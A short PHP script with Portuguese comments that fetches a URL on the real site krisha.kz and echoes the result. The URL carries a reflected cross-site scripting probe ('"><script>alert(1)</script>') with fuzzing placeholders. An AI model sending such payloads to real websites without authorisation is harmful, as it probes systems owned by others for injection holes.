<?php
// URL que você deseja acessar
$url = 'https://krisha.kz/landing/agents/?action=FUZZtmpas"><script>alert(1)</script>w3iz1&geoId=FUZZ';

// Use file_get_contents para buscar o conteúdo da página
$content = file_get_contents($url);

// Verifique se a solicitação foi bem-sucedida
if ($content !== false) {
    // O conteúdo da página está em $content
    echo $content;
} else {
    // Trate o erro, se necessário
    echo 'Erro ao acessar a página.';
}
?>
